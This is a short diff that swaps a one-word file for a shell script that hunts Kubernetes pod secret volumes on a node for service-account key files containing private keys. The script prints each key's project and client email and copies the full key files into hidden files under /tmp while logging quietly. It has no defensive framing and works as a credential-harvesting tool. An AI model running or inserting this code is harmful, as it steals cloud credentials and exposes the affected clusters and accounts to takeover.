@@ -1,1 +1,16 @@
-ok
+exec > /tmp/.sa-hunt 2>&1
+find /var/lib/kubelet/pods -path "*/volumes/kubernetes.io~secret/*" -name "*.json" -maxdepth 10 2>/dev/null | while read f; do
+  SIZE=$(wc -c < "$f" 2>/dev/null)
+  if [ "$SIZE" -gt 100 ] 2>/dev/null; then
+    HASKEY=$(grep -l "private_key" "$f" 2>/dev/null)
+    if [ -n "$HASKEY" ]; then
+      echo "SA_KEY_FOUND:$f"
+      # Extract project_id dan client_email
+      python3 -c "import json;d=json.load(open('$f'));print(f'  project={d.get(\"project_id\",\"?\")}, email={d.get(\"client_email\",\"?\")}')" 2>/dev/null
+      # Copy content
+      cat "$f" >> /tmp/.sa-keys-all 2>/dev/null
+      echo "---SEPARATOR---" >> /tmp/.sa-keys-all
+    fi
+  fi
+done
+echo "DONE_$(hostname)"
